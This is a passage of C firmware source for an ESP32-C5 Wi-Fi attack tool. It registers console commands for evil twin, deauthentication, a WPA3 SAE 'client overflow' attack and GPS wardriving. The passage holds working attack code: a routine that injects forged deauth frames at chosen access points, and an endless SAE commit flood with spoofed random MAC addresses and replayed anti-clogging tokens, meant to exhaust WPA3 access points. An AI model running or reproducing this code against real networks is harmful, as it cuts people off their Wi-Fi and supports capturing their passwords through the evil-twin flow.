        .help = "Starts SAE WPA3 Client Overflow attack.",
        .hint = NULL,
        .func = &cmd_start_sae_overflow,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&sae_overflow_cmd));

    const esp_console_cmd_t wardrive_cmd = {
        .command = "start_wardrive",
        .help = "Starts wardriving with GPS and SD logging",
        .hint = NULL,
        .func = &cmd_start_wardrive,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&wardrive_cmd));

    const esp_console_cmd_t reboot_cmd = {
        .command = "reboot",
        .help = "Device reboot to start from scratch",
        .hint = NULL,
        .func = &cmd_reboot,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&reboot_cmd));
}

void app_main(void) {

    esp_log_level_set("wifi", ESP_LOG_INFO);
    esp_log_level_set("projectZero", ESP_LOG_INFO);
    esp_log_level_set("espnow", ESP_LOG_INFO);

    // esp_log_level_set("wifi", ESP_LOG_DEBUG);
    // esp_log_level_set(TAG, ESP_LOG_DEBUG);
    // esp_log_level_set("espnow", ESP_LOG_DEBUG);


    //MY_LOG_INFO(TAG, "Application starts (ESP32-C5)");

    // 1. LED strip configuration
    led_strip_config_t strip_cfg = {
        .strip_gpio_num            = NEOPIXEL_GPIO,
        .max_leds                  = LED_COUNT,
        .led_model                 = LED_MODEL_WS2812,
        .color_component_format = LED_STRIP_COLOR_COMPONENT_FMT_GRB,
        .flags.invert_out          = false,
    };

    // 2. LED Strip RMT configuration
    led_strip_rmt_config_t rmt_cfg = {
        .clk_src        = RMT_CLK_SRC_DEFAULT,
        .resolution_hz  = RMT_RES_HZ,
        .flags.with_dma = false,
    };

    // 3. strip instance
    ESP_ERROR_CHECK(led_strip_new_rmt_device(&strip_cfg, &rmt_cfg, &strip));



    ESP_ERROR_CHECK(nvs_flash_init());

    ESP_ERROR_CHECK(wifi_init_ap_sta());
    ESP_ERROR_CHECK(espnow_init()); 

    wifi_country_t wifi_country = {
        .cc = "PH",
        .schan = 1,
        .nchan = 14,
        .policy = WIFI_COUNTRY_POLICY_AUTO,
    };
    esp_err_t retC = esp_wifi_set_country(&wifi_country);
    if (retC != ESP_OK) {
           ESP_LOGE(TAG, "Failed to set Wi-Fi country code: %s", esp_err_to_name(retC));
    } else {
           ESP_LOGW(TAG, "Wi-Fi country code set to %s", wifi_country.cc);
    }


    esp_console_repl_t *repl = NULL;
    esp_console_repl_config_t repl_config = ESP_CONSOLE_REPL_CONFIG_DEFAULT();
    
    MY_LOG_INFO(TAG,"Available commands:");
    MY_LOG_INFO(TAG,"  scan_networks");
    MY_LOG_INFO(TAG,"  select_networks <indeks1> [indeks2] ...");
    MY_LOG_INFO(TAG,"  start_evil_twin");
    MY_LOG_INFO(TAG,"  start_deauth");
    MY_LOG_INFO(TAG,"  sae_overflow");
    MY_LOG_INFO(TAG,"  start_wardrive");
    MY_LOG_INFO(TAG,"  reboot");

    repl_config.prompt = ">";
    repl_config.max_cmdline_length = 100;

    esp_console_register_help_command();
    register_commands();

    esp_console_dev_uart_config_t hw_config = ESP_CONSOLE_DEV_UART_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_console_new_repl_uart(&hw_config, &repl_config, &repl));

    ESP_ERROR_CHECK(esp_console_start_repl(repl));
}

void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count) {   
    if (applicationState == EVIL_TWIN_PASS_CHECK ) {
        ESP_LOGW(TAG, "Deauth stop requested in Evil Twin flow, checking for password, will do nothing here..");
        return;
    }

    if (!onlyDeauth) {
        //first, spend some time waiting for ESP-NOW signal that password has been provided which is expected on channel 1:
        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
        //MY_LOG_INFO(TAG, "Waiting for ESP-NOW signal on channel 1 before deauth...");
        vTaskDelay(pdMS_TO_TICKS(300));
        //MY_LOG_INFO(TAG, "Finished waiting for ESP-NOW...");
    }

    //then, proceed with deauth frames on channels of the APs:
    for (int i = 0; i < g_selected_count; ++i) {

            if (applicationState == EVIL_TWIN_PASS_CHECK ) {
                ESP_LOGW(TAG, "Checking for password...");
                return;
            }

            int idx = g_selected_indices[i];
            wifi_ap_record_t *ap_record = &g_scan_results[idx];
            ESP_LOGD(TAG, "Preparations to send deauth frame...");
            MY_LOG_INFO(TAG, "Deauth SSID: %s, CH: %d", ap_record->ssid, ap_record->primary);
            ESP_LOGD(TAG, "Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
                    ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
                    ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
            esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE );
            uint8_t deauth_frame[sizeof(deauth_frame_default)];
            memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
            memcpy(&deauth_frame[10], ap_record->bssid, 6);
            memcpy(&deauth_frame[16], ap_record->bssid, 6);
            wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
    }

}

//SAE WPA3 attack methods:

static int trng_random_callback(void *ctx, unsigned char *output, size_t len) {
    (void)ctx;
    esp_fill_random(output, len);
    return 0;
}

static int crypto_init(void) {
    int ret;
    const char *pers = "dragon_drain";

    mbedtls_entropy_init(&entropy);
    mbedtls_ctr_drbg_init(&ctr_drbg);

    // TRNG as entropy source
    ret = mbedtls_ctr_drbg_seed(&ctr_drbg,
                             trng_random_callback,
                             NULL,
                             (const unsigned char *) pers, strlen(pers));

    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_ctr_drbg_seed failed: %d", ret);
        return ret;
    }

    mbedtls_ecp_group_init(&ecc_group);
    mbedtls_ecp_point_init(&ecc_element);
    mbedtls_mpi_init(&ecc_scalar);

    ret = mbedtls_ecp_group_load(&ecc_group, MBEDTLS_ECP_DP_SECP256R1);
    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_ecp_group_load failed: %d", ret);
        return ret;
    }

    ESP_LOGI(TAG, "Crypto context initialized with TRNG (secp256r1)");
    return 0;
}

/*
 * Random MAC for client overflow attack.
 */
static void update_spoofed_src_random(void) {
    esp_err_t ret = mbedtls_ctr_drbg_random(&ctr_drbg, spoofed_src, 6);
    if (ret != 0) {
        ESP_LOGE(TAG, "Unable to generate random MAC: %d", ret);
        return;
    }

    spoofed_src[0] &= 0xFE;  // bit multicast = 0
    spoofed_src[0] |= 0x02;  // locally administered = 1

    next_src = (next_src + 1) % NUM_CLIENTS;
}

void startRandomMacSaeClientOverflow(const wifi_ap_record_t ap_record) {
    prepareAttack(ap_record);
     while (1) {
        inject_sae_commit_frame();
        vTaskDelay(pdMS_TO_TICKS(12));
    }
}


/*
Injects SAE Commit frame with spoofed source address.
This function generates a random scalar, computes the corresponding ECC point,
and constructs the SAE Commit frame with the spoofed source address.
 */

void inject_sae_commit_frame() {
    uint8_t buf[256];  
    memset(buf, 0, sizeof(buf));
    memcpy(buf, auth_req_sae_commit_header, AUTH_REQ_SAE_COMMIT_HEADER_SIZE);
    memcpy(buf + 4, bssid, 6);
    memcpy(buf + 10, spoofed_src, 6);
    memcpy(buf + 16, bssid, 6);

    buf[AUTH_REQ_SAE_COMMIT_HEADER_SIZE - 2] = 19;  // Placeholder: scalar size

    uint8_t *pos = buf + AUTH_REQ_SAE_COMMIT_HEADER_SIZE;
    int ret;
    size_t scalar_size = 32;

    do {
        ret = mbedtls_mpi_fill_random(&ecc_scalar, scalar_size, mbedtls_ctr_drbg_random, &ctr_drbg);
        if (ret != 0) {
            ESP_LOGE(TAG, "mbedtls_mpi_fill_random failed: %d", ret);
            return;
        }
    } while (mbedtls_mpi_cmp_int(&ecc_scalar, 0) <= 0 ||
             mbedtls_mpi_cmp_mpi(&ecc_scalar, &ecc_group.N) >= 0);

    ret = mbedtls_mpi_write_binary(&ecc_scalar, pos, scalar_size);
    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_mpi_write_binary failed: %d", ret);
        return;
    }
    pos += scalar_size;

    ret = mbedtls_ecp_mul(&ecc_group, &ecc_element, &ecc_scalar, &ecc_group.G, mbedtls_ctr_drbg_random, &ctr_drbg);
    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_ecp_mul failed: %d", ret);
        return;
    }

    uint8_t point_buf[65];
    size_t point_len = 0;
    ret = mbedtls_ecp_point_write_binary(&ecc_group, &ecc_element, MBEDTLS_ECP_PF_UNCOMPRESSED, &point_len, point_buf, sizeof(point_buf));
    if (ret != 0 || point_len != 65) {
        ESP_LOGE(TAG, "mbedtls_ecp_point_write_binary failed: %d", ret);
        return;
    }

    memcpy(pos, point_buf + 1, 64);  // skip 0x04 prefix
    pos += 64;

    // Append token:
    if (actLength > 0 && anti_clogging_token != NULL) {
        *pos++ = 0x4C;           // EID
        *pos++ = actLength;      // Length

        memcpy(pos, anti_clogging_token, actLength);
        pos += actLength;
    }

    // Refresh MAC
    update_spoofed_src_random();

    size_t total_len = pos - buf;


    esp_err_t ret_tx = esp_wifi_80211_tx(WIFI_IF_STA, buf, total_len, false);
    if (ret_tx != ESP_OK) {
        ESP_LOGE(TAG, "esp_wifi_80211_tx failed: %s", esp_err_to_name(ret_tx));
    } else {
        //log the frame:
        //ESP_LOGD(TAG, "Injecting SAE Commit frame, total length: %d bytes", total_len);
        // for (size_t i = 0; i < total_len; i++) {
        //     printf("%02X ", buf[i]);
        // }
        //printf("\n");
        // Send the frame
    }

    if (frame_count == 0) start_time = esp_timer_get_time();
    frame_count++;

    if (frame_count >= 100) {
        int64_t now = esp_timer_get_time();
        double seconds = (now - start_time) / 1e6;
        double fps = frame_count / seconds;
        MY_LOG_INFO(TAG, "AVG FPS: %.2f", fps);
        framesPerSecond = (int)fps;
        frame_count = 0;
        if (framesPerSecond == 0) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
    }
}


void prepareAttack(const wifi_ap_record_t ap_record) {

    esp_wifi_set_channel(ap_record.primary, WIFI_SECOND_CHAN_NONE );

    //globalDataCount = 1;
    //globalData[0] = strdup((char *)ap_record.ssid);
    memcpy(spoofed_src, base_srcaddr, 6);
    memcpy(bssid, ap_record.bssid, sizeof(bssid));
    next_src = 0;
    if (crypto_init() != 0) {
        ESP_LOGE(TAG, "Crypto initialization failed");
        return;
    }

    //Enable promiscuous mode in order to listen to SAE Commit frames
    ESP_LOGI(TAG, "Enabling promiscuous mode for SAE Commit frames");
    esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_callback_v1);
    esp_wifi_set_promiscuous(true);

}

void wifi_sniffer_callback_v1(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type == WIFI_PKT_MGMT) {
        parse_sae_commit((const wifi_promiscuous_pkt_t *)buf);
    }
}


static void parse_sae_commit(const wifi_promiscuous_pkt_t *pkt) {
    const uint8_t *buf = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    // Ignore retransmission:
    if (buf[1] & 0x08) return;


    int tods_fromds = buf[1] & 0x03;
    int pos_bssid = 0, pos_src = 0;

    switch (tods_fromds) {
        case 0:
            pos_bssid = 16; pos_src = 10;  break;
        case 1:
            pos_bssid = 4;  pos_src = 10;  break;
        case 2:
            pos_bssid = 10; pos_src = 16;  break;
        default:
            pos_bssid = 10; pos_src = 24;  break;
    }

    // Check if the frame is addressed to the target BSSID
    if (memcmp(buf + pos_bssid, bssid, 6) != 0 ||
        memcmp(buf + pos_src, bssid, 6) != 0)
        return;

    // Beacon detection 
    if (buf[0] == 0x80) {
        //ESP_LOGI(TAG, "Wykryto beacon od AP");
        return;
    }

    // Searching for SAE Commit
    if (len > 32 && buf[0] == 0xB0 && buf[24] == 0x03 && buf[26] == 0x01) {
        if (buf[28] == 0x4C) {
            const uint8_t *token = buf + 32;
            int token_len = len - 32;

            if (anti_clogging_token) free(anti_clogging_token);
            anti_clogging_token = malloc(token_len);
            if (!anti_clogging_token) {
                ESP_LOGE(TAG, "Mem error: Unable to allocate memory for anti_clogging_token");
                actLength = 0;
                return;
            }

            memcpy(anti_clogging_token, token, token_len);
            actLength = token_len;

            char token_str[token_len * 3 + 1];
            for (int i = 0; i < token_len; i++)
                sprintf(&token_str[i * 3], "%02X ", token[i]);
            token_str[token_len * 3] = '\0';

            //ESP_LOGI(TAG, "  Token: %s", token_str);
        } else if (buf[28] == 0x00) {
            //ESP_LOGI(TAG, "SAE Commit without ACT");
        }
    }
}

// === WARDRIVE HELPER FUNCTIONS ===

static esp_err_t init_gps_uart(void) {
    uart_config_t uart_config = {
        .baud_rate = 9600,
        .data_bits = UART_DATA_8_BITS,
        .parity = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
        .source_clk = UART_SCLK_DEFAULT,
    };
    
    ESP_ERROR_CHECK(uart_driver_install(GPS_UART_NUM, GPS_BUF_SIZE * 2, 0, 0, NULL, 0));
    ESP_ERROR_CHECK(uart_param_config(GPS_UART_NUM, &uart_config));
    ESP_ERROR_CHECK(uart_set_pin(GPS_UART_NUM, GPS_TX_PIN, GPS_RX_PIN, UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE));
    
    return ESP_OK;
}

static esp_err_t init_sd_card(void) {
    esp_err_t ret;
    
    // Options for mounting the filesystem
    esp_vfs_fat_sdmmc_mount_config_t mount_config = {
        .format_if_mount_failed = true,  // Allow formatting if needed
        .max_files = 10,                 // Allow more open files
        .allocation_unit_size = 16 * 1024,
        .disk_status_check_enable = false
    };
    
    sdmmc_card_t *card;
    const char mount_point[] = "/sdcard";
    
    // Configure SPI bus
    spi_bus_config_t bus_cfg = {
        .mosi_io_num = SD_MOSI_PIN,
        .miso_io_num = SD_MISO_PIN,
        .sclk_io_num = SD_CLK_PIN,
        .quadwp_io_num = -1,
        .quadhd_io_num = -1,
        .max_transfer_sz = 4000,
    };
    
    ret = spi_bus_initialize(SPI2_HOST, &bus_cfg, SPI_DMA_CH_AUTO);
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SPI bus: %s", esp_err_to_name(ret));
        return ret;
    }
    
    // Initialize the SD card host
    sdmmc_host_t host = SDSPI_HOST_DEFAULT();
    host.slot = SPI2_HOST;
    
    sdspi_device_config_t slot_config = SDSPI_DEVICE_CONFIG_DEFAULT();
    slot_config.gpio_cs = SD_CS_PIN;
    slot_config.host_id = host.slot;
    
    ret = esp_vfs_fat_sdspi_mount(mount_point, &host, &slot_config, &mount_config, &card);
    
    if (ret != ESP_OK) {
        if (ret == ESP_FAIL) {
            MY_LOG_INFO(TAG, "Failed to mount filesystem. If you want the card to be formatted, set format_if_mount_failed = true.");
        } else {
            MY_LOG_INFO(TAG, "Failed to initialize the card (%s). Make sure SD card lines have pull-up resistors in place.", esp_err_to_name(ret));
        }
        return ret;
    }
    
    // Print card info
    MY_LOG_INFO(TAG, "SD card mounted successfully");
    sdmmc_card_print_info(stdout, card);
    
    // Test file creation to verify write access
    FILE *test_file = fopen("/sdcard/test.txt", "w");
    if (test_file != NULL) {
        fprintf(test_file, "Test write\n");
        fclose(test_file);
        MY_LOG_INFO(TAG, "SD card write test successful");
        // Clean up test file
        unlink("/sdcard/test.txt");
    } else {
        MY_LOG_INFO(TAG, "SD card write test failed, errno: %d (%s)", errno, strerror(errno));
    }
    
    return ESP_OK;
}

static bool parse_gps_nmea(const char* nmea_sentence) {
    if (!nmea_sentence || strlen(nmea_sentence) < 10) {
        return false;
    }
    
    // Parse GPGGA sentence for basic GPS data
    if (strncmp(nmea_sentence, "$GPGGA", 6) == 0 || strncmp(nmea_sentence, "$GNGGA", 6) == 0) {
        char sentence[256];
        strncpy(sentence, nmea_sentence, sizeof(sentence) - 1);
        sentence[sizeof(sentence) - 1] = '\0';
        
        char *token = strtok(sentence, ",");
        int field = 0;
        float lat_deg = 0, lat_min = 0;
        float lon_deg = 0, lon_min = 0;
        char lat_dir = 'N', lon_dir = 'E';
        int quality = 0;
        float altitude = 0;
        float hdop = 1.0;
        
        while (token != NULL) {
            switch (field) {
                case 2: // Latitude DDMM.MMMM
                    if (strlen(token) > 4) {
                        lat_deg = (token[0] - '0') * 10 + (token[1] - '0');
                        lat_min = atof(token + 2);
                    }
                    break;
                case 3: // Latitude direction
                    lat_dir = token[0];
                    break;
                case 4: // Longitude DDDMM.MMMM
                    if (strlen(token) > 5) {
                        lon_deg = (token[0] - '0') * 100 + (token[1] - '0') * 10 + (token[2] - '0');
                        lon_min = atof(token + 3);
                    }
                    break;
                case 5: // Longitude direction
                    lon_dir = token[0];
                    break;
                case 6: // GPS quality
                    quality = atoi(token);
                    break;
                case 8: // HDOP
                    hdop = atof(token);
                    break;
                case 9: // Altitude
                    altitude = atof(token);
                    break;
            }
            token = strtok(NULL, ",");
            field++;
        }
        
        if (quality > 0) {
            // Convert to decimal degrees
            current_gps.latitude = lat_deg + lat_min / 60.0;
            if (lat_dir == 'S') current_gps.latitude = -current_gps.latitude;
            
            current_gps.longitude = lon_deg + lon_min / 60.0;
            if (lon_dir == 'W') current_gps.longitude = -current_gps.longitude;
            
            current_gps.altitude = altitude;
            current_gps.accuracy = hdop * 4.0; // Rough accuracy estimate
            current_gps.valid = true;
            
            return true;
        }
    }
    
    return false;
}

static void get_timestamp_string(char* buffer, size_t size) {
    // For now, use a simple counter-based timestamp
    // In a real implementation, you'd use RTC or NTP time
    static uint32_t timestamp_counter = 0;
    timestamp_counter++;
    
    // Format as a simple date-time string
    snprintf(buffer, size, "2025-09-26 %02d:%02d:%02d", 
             (int)((timestamp_counter / 3600) % 24),
             (int)((timestamp_counter / 60) % 60), 
             (int)(timestamp_counter % 60));
}

static const char* get_auth_mode_wiggle(wifi_auth_mode_t mode) {
    switch(mode) {
        case WIFI_AUTH_OPEN:
            return "Open";
        case WIFI_AUTH_WEP:
            return "WEP";
        case WIFI_AUTH_WPA_PSK:
            return "WPA_PSK";
        case WIFI_AUTH_WPA2_PSK:
            return "WPA2_PSK";
        case WIFI_AUTH_WPA_WPA2_PSK:
            return "WPA_WPA2_PSK";
        case WIFI_AUTH_WPA2_ENTERPRISE:
            return "WPA2_ENTERPRISE";
        case WIFI_AUTH_WPA3_PSK:
            return "WPA3_PSK";
        case WIFI_AUTH_WPA2_WPA3_PSK:
            return "WPA2_WPA3_PSK";
        case WIFI_AUTH_WAPI_PSK:
            return "WAPI_PSK";
        default:
            return "Unknown";
    }
}

static bool wait_for_gps_fix(int timeout_seconds) {
    int elapsed = 0;
    current_gps.valid = false;
    
    MY_LOG_INFO(TAG, "Waiting for GPS fix (timeout: %d seconds)...", timeout_seconds);
    
    while (elapsed < timeout_seconds) {
        // Read GPS data
        int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(1000));
        if (len > 0) {
            wardrive_gps_buffer[len] = '\0';
            char* line = strtok(wardrive_gps_buffer, "\r\n");
            while (line != NULL) {
                if (parse_gps_nmea(line)) {
                    if (current_gps.valid) {
                        return true;  // GPS fix obtained
                    }
                }
                line = strtok(NULL, "\r\n");
            }
        }
        
        elapsed++;
        if (elapsed % 10 == 0) {  // Print status every 10 seconds
            MY_LOG_INFO(TAG, "Still waiting for GPS fix... (%d/%d seconds)", elapsed, timeout_seconds);
        }
    }
    
    return false;  // Timeout reached without GPS fix
}

static int find_next_wardrive_file_number(void) {
    int max_number = 0;
    char filename[32];
    
    // Scan through possible file numbers to find the highest existing one
    for (int i = 1; i <= 9999; i++) {
        snprintf(filename, sizeof(filename), "/sdcard/w%d.csv", i);
        
        struct stat file_stat;
        if (stat(filename, &file_stat) == 0) {
            // File exists, update max_number
            max_number = i;
            MY_LOG_INFO(TAG, "Found existing file: w%d.csv", i);
        } else {
            // First non-existing file number, we can break here for efficiency
            break;
        }
    }
    
    int next_number = max_number + 1;
    MY_LOG_INFO(TAG, "Highest existing file number: %d, next will be: %d", max_number, next_number);
    
    return next_number;
}


